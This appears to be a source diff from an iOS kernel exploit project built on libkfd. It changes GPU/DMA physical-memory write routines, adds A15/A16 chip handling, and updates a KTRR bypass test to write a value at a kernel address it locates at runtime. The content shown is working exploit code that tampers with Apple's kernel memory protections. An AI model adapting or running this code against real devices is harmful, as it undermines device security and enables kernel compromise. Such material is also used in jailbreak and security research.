@@ -11,6 +11,7 @@
 #import <sys/sysctl.h>
 #include "IOSurface_Primitives.h"
 #include "libkfd.h"
+#include "kfd_meow-Swift.h"
 
 struct shit_map {
     uint64_t pa;
@@ -117,15 +118,18 @@ void gfx_power_init(void)
 
     uint64_t base = 0;
     uint32_t command = 0;
+    bool isa15a16 = false;
 
     switch (cpuFamily) {
         case 0x8765EDEA: // A16
         base = 0x23B700408;
         command = 0x1F0023FF;
+        isa15a16=true;
         break;
         case 0xDA33D83D: // A15
         base = 0x23B7003C8;
         command = 0x1F0023FF;
+        isa15a16=true;
         break;
         case 0x1B588BB3: // A14
         base = 0x23B7003D0;
@@ -187,7 +191,7 @@ void dma_ctrl_3(uint64_t value)
 
     physwrite64_mapped(ctrl, physread64_mapped(ctrl) & value);
 
-    while ((physread64_mapped(ctrl) & 0x8000000000000001) != 0) { /*sleep(1);*/ }
+    while ((physread64_mapped(ctrl) & 0x8000000000000001) != 0) { sleep(1); }
 }
 
 void dma_init(uint64_t orig)
@@ -266,15 +270,18 @@ void dma_writephys512(uint64_t targetPA, uint64_t *value)
 
     uint32_t i = 0;
     uint64_t mask = 0;
+    bool isa15a16 = false;
 
     switch (cpuFamily) {
         case 0x8765EDEA: // A16
         i = 8;
         mask = 0x7FFFFFF;
+        isa15a16=true;
         break;
         case 0xDA33D83D: // A15
         i = 8;
         mask = 0x3FFFFF;
+        isa15a16=true;
         break;
         case 0x1B588BB3: // A14
         i = 0x28;
@@ -486,8 +493,10 @@ int test_pplrw(void)
 
 int test_kttr(void)
 {
+    objcbridge *obj = [[objcbridge alloc] init];
+    uint64_t target = [obj find_ktrr];
     dma_perform(^{
-        dma_writevirt32(get_kaslr_slide() + 0xfffffff007d6b998, 0x37c3);
+        dma_writevirt32(get_kaslr_slide() + target, 0x37c3);
     });
     return 0;
 }
